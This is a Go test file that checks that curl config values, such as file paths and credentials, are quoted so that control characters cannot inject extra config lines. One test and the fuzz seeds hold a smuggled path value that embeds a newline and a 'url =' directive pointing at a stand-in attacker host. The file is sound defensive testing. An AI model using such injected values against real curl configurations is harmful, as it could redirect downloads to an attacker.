package remote

import (
	"strings"
	"testing"
)

func TestCfgQuoteEscapesCurlConfigControlCharacters(t *testing.T) {
	input := "folder\tname\nnext\rline\vquote\"slash\\end"
	got := cfgQuote(input)
	want := `"folder\tname\nnext\rline\vquote\"slash\\end"`
	if got != want {
		t.Fatalf("cfgQuote()=%q want %q", got, want)
	}
	if strings.ContainsAny(got, "\t\n\r\v") {
		t.Fatalf("cfgQuote left a physical config control character in %q", got)
	}
}

func TestAppendCfgQuotedBytesMatchesStringQuoting(t *testing.T) {
	input := []byte("user\tname:pass\nword\rnext\vline\"\\")
	got := string(appendCfgQuotedBytes(nil, input))
	want := cfgQuote(string(input))
	if got != want {
		t.Fatalf("appendCfgQuotedBytes()=%q want %q", got, want)
	}
	if strings.ContainsAny(got, "\t\n\r\v") {
		t.Fatalf("byte quoting left a physical config control character in %q", got)
	}
}

func TestCurlDownloadOutputPathCannotInjectConfigLine(t *testing.T) {
	path := "/safe/root\nurl = \"https://attacker.invalid/\"/.GhostFTP-part-token"
	line := "output = " + cfgQuote(path)
	if strings.ContainsAny(line, "\r\n") {
		t.Fatalf("quoted output path created an additional physical curl config line: %q", line)
	}
	if !strings.Contains(line, `\nurl = \"https://attacker.invalid/\"`) {
		t.Fatalf("newline was not encoded inside the quoted value: %q", line)
	}
}

func FuzzCurlConfigQuoting(f *testing.F) {
	for _, seed := range []string{
		"plain",
		"with spaces",
		"quote\"and\\slash",
		"tab\tnewline\ncarriage\rvertical\v",
		"/tmp/root\nurl = \"https://attacker.invalid/\"/file",
	} {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, input string) {
		quoted := cfgQuote(input)
		if len(quoted) < 2 || quoted[0] != '"' || quoted[len(quoted)-1] != '"' {
			t.Fatalf("quoted value is not bounded by double quotes: %q", quoted)
		}
		if strings.ContainsAny(quoted, "\t\n\r\v") {
			t.Fatalf("quoted value contains a physical curl config control character: %q", quoted)
		}
		byteQuoted := string(appendCfgQuotedBytes(nil, []byte(input)))
		if byteQuoted != quoted {
			t.Fatalf("string and byte quoting diverged: string=%q bytes=%q", quoted, byteQuoted)
		}
	})
}
